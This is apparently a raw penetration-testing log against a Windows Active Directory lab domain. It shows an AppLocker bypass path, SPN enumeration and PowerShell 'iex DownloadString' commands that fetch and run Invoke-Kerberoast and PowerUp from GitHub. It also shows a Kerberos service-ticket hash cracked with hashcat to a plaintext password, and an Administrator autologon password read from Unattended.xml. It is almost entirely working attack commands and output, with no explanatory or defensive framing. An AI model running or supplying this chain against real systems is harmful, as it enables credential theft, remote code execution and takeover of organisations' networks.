```
Bypass Applocker
C:\Windows\System32\spool\drivers\color

ConsoleHost_history
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.tx


C:\Users\dark>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\dark> setspn -T medin -Q */*
Ldap Error(0x51 -- Server Down): ldap_connect
Failed to retrieve DN for domain "medin" : 0x00000051
Warning: No valid targets specified, reverting to current domain.
CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
        ldap/omega.corp.local/ForestDnsZones.corp.local
        ldap/omega.corp.local/DomainDnsZones.corp.local
        TERMSRV/OMEGA
        TERMSRV/omega.corp.local
        DNS/omega.corp.local
        GC/omega.corp.local/corp.local
        RestrictedKrbHost/omega.corp.local
        RestrictedKrbHost/OMEGA
        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        HOST/OMEGA/CORP
        HOST/omega.corp.local/CORP
        HOST/OMEGA
        HOST/omega.corp.local
        HOST/omega.corp.local/corp.local
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
        ldap/OMEGA/CORP
        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        ldap/omega.corp.local/CORP
        ldap/OMEGA
        ldap/omega.corp.local
        ldap/omega.corp.local/corp.local
CN=krbtgt,CN=Users,DC=corp,DC=local
        kadmin/changepw
CN=fela,CN=Users,DC=corp,DC=local
        HTTP/fela
        HOST/fela@corp.local
        HTTP/fela@corp.local

Existing SPN found!
PS C:\Users\dark>


	
PS C:\Users\dark> iex(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')

PS C:\Users\dark> Invoke-Kerberoast -OutputFormat hashcat |fl


TicketByteHexStream  :
Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$DE678E1B26B1267271074F8B4BBD4C7A$BDAD4E93920FE2A61450ED3
                       9385A1F3CD69C44702D8FC726D06766A383782C9E8B001BC83F16147A2A4964D18DFE235B5C58DD3C275699FED34B926
                       926F26595727CB3B7BCF83F6713ED04FA98A4B09D33DD0D56562A4255CE6326E07CB2A06D5105A8FAFA5D0440420CB98
                       9AC2FE3C1ADB0008A9C2FBEFDD3A923F4C0109CBA7624642E7FB1A66C8567F39EA88D0A86B8E39696C2524E9B7B60AA4
                       9B60D7557810C085DEF5F7B76B6DEEEBC5B9005007DBF233F65841FF824E085EA67E6627A7D2DCEDD60BF2F4CCB05362
                       F5E95A77B5F917D049F9CE1D5A258AE1F14FED18F707845380BD8575A501B56D61511BE9FCCD776D8A7CBA029591B22B
                       C996026C3CA8C568862EE40D63CF382E901AF629A76D40CC38184F6C2E6F36A51BECE937F432937C18DBCCDAA5D3C363
                       9A12DA2E6FFEB55B7F1F17FDE7371EDF1FBDFA7A5CF80C05E23678B63DB48C6304B391D4C28A2E5E288AAC8E1F2696AF
                       C24D3B77F14874AADB99C249925D11F59AA4820D59910CD3EAEDC1041BFA12642ACAAA79DA09343F768E9B14F36BA036
                       A606D667F88FDE5B95AE078401C99703DD77ADC2A330EA34F331B86B64FAF0FA948507A04C0D20A2F32A50E0ACD501DC
                       193C086AE2E29A4C0CA61D19CF522ACC2080E9BF94AC12AA6CB69219BAA95181F7DD2B97E8A39EC351E1B38E5A6978E1
                       DED4AC467CB2FC7553132320601FF5C06A813E32B26FC2822EFC20F1B272995921E93EDBDC0306046359AF4D704B90A9
                       C8AD166A4570D5E7D5246956E83991A735026205228FE14BB8FB2516E2E23B902E98D8D8862141BA487178E819AB9C7F
                       AF040CE4F411EA453EC0EC58B4A7899AE8F639FA02DEE50B575BC1C4553A2E01FF85EECDB415F420D6843FB7E52A5452
                       3115CB348EACC86FDDD6AEFE1E6E7B14EE1F2E843389E1F70D1064FE1989D9C747A73E3279340A35B42635C3E6CCC7A6
                       3974CE22E025B52425A4577C24EAB98C6D7E7D3667A413C23757563F69E4CDDB10721A5E0FEE2F5DA48FDF1A5C311F87
                       480D2F9649DDB6F799763188A0E1BC4AB08832EE5159A26F8DE3FD8A4B0E398E68D90E495BF774A4F71799F68F3CF1F9
                       320F3C1C06ABE241CF7311061C27185797206367697349ADA6FB0C1D2484EE5D07A833AE39C08A4D3C5F752B5701C2D4
                       E998C6B26FB805DD58EFBA3E4DC4064D55E563AE6AAFE0D67320040EED33B13F882414BCAF6BA1BA4CC8A99AA19611FA
                       728B99C190B8D21B0390D10BEB4EEC94F286DB119EDB26F6686650EE4E789B2211EE9E38593764BB8AD0916A4FBDE94A
                       CA160918BB12353A0B60AB6A41EA6F205A1EBE359785CCA9F1383CD1DB863B87E2CEED423EDB9DABF6969223AE75F419
                       EBD2B57FDE4C101B41BBB3131EAD4EF6E378C749D12
SamAccountName       : fela
DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
ServicePrincipalName : HTTP/fela



PS C:\Users\dark>


root@kali:~# hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --f
orce
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz, 1024/2953 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=13100 -D _unroll'
* Device #1: Kernel m13100_a0-pure.65803afe.kernel not found in cache! Building may take a while...
Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106869 bytes (47.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213744 bytes (95.Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

$krb5tgs$23$*fela$corp.local$HTTP/fela*$de678e1b26b1267271074f8b4bbd4c7a$bdad4e93920fe2a61450ed39385a1f3cd69c44702d8fc726d06766a383782c9e8b001bc83f16147a2a4964d18dfe235b5c58dd3c275699fed34b926926f26595727cb3b7bcf83f6713ed04fa98a4b09d33dd0d56562a4255ce6326e07cb2a06d5105a8fafa5d0440420cb989ac2fe3c1adb0008a9c2fbefdd3a923f4c0109cba7624642e7fb1a66c8567f39ea88d0a86b8e39696c2524e9b7b60aa49b60d7557810c085def5f7b76b6deeebc5b9005007dbf233f65841ff824e085ea67e6627a7d2dcedd60bf2f4ccb05362f5e95a77b5f917d049f9ce1d5a258ae1f14fed18f707845380bd8575a501b56d61511be9fccd776d8a7cba029591b22bc996026c3ca8c568862ee40d63cf382e901af629a76d40cc38184f6c2e6f36a51bece937f432937c18dbccdaa5d3c3639a12da2e6ffeb55b7f1f17fde7371edf1fbdfa7a5cf80c05e23678b63db48c6304b391d4c28a2e5e288aac8e1f2696afc24d3b77f14874aadb99c249925d11f59aa4820d59910cd3eaedc1041bfa12642acaaa79da09343f768e9b14f36ba036a606d667f88fde5b95ae078401c99703dd77adc2a330ea34f331b86b64faf0fa948507a04c0d20a2f32a50e0acd501dc193c086ae2e29a4c0ca61d19cf522acc2080e9bf94ac12aa6cb69219baa95181f7dd2b97e8a39ec351e1b38e5a6978e1ded4ac467cb2fc7553132320601ff5c06a813e32b26fc2822efc20f1b272995921e93edbdc0306046359af4d704b90a9c8ad166a4570d5e7d5246956e83991a735026205228fe14bb8fb2516e2e23b902e98d8d8862141ba487178e819ab9c7faf040ce4f411ea453ec0ec58b4a7899ae8f639fa02dee50b575bc1c4553a2e01ff85eecdb415f420d6843fb7e52a54523115cb348eacc86fddd6aefe1e6e7b14ee1f2e843389e1f70d1064fe1989d9c747a73e3279340a35b42635c3e6ccc7a63974ce22e025b52425a4577c24eab98c6d7e7d3667a413c23757563f69e4cddb10721a5e0fee2f5da48fdf1a5c311f87480d2f9649ddb6f799763188a0e1bc4ab08832ee5159a26f8de3fd8a4b0e398e68d90e495bf774a4f71799f68f3cf1f9320f3c1c06abe241cf7311061c27185797206367697349ada6fb0c1d2484ee5d07a833ae39c08a4d3c5f752b5701c2d4e998c6b26fb805dd58efba3e4dc4064d55e563ae6aafe0d67320040eed33b13f882414bcaf6ba1ba4cc8a99aa19611fa728b99c190b8d21b0390d10beb4eec94f286db119edb26f6686650ee4e789b2211ee9e38593764bb8ad0916a4fbde94aca160918bb12353a0b60ab6a41ea6f205a1ebe359785cca9f1383cd1db863b87e2ceed423edb9dabf6969223ae75f419ebd2b57fde4c101b41bbb3131ead4ef6e378c749d12:rubenF124

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: $krb5tgs$23$*fela$corp.local$HTTP/fela*$de678e1b26b...749d12
Time.Started.....: Mon May 25 13:50:28 2020 (10 secs)
Time.Estimated...: Mon May 25 13:50:38 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   406.2 kH/s (12.59ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 4136960/14344385 (28.84%)
Rejected.........: 0/4136960 (0.00%)
Restore.Point....: 4128768/14344385 (28.78%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: ruddrooney -> rsqqst78en

Started: Mon May 25 13:50:11 2020
Stopped: Mon May 25 13:50:39 2020
root@kali:~#


PS C:\Users\dark> iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')
PS C:\Users\dark> type C:\Windows\Panther\Unattend\Unattended.xml
<AutoLogon>
    <Password>
        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Administrator</Username>
</AutoLogon>
PS C:\Users\dark>
```
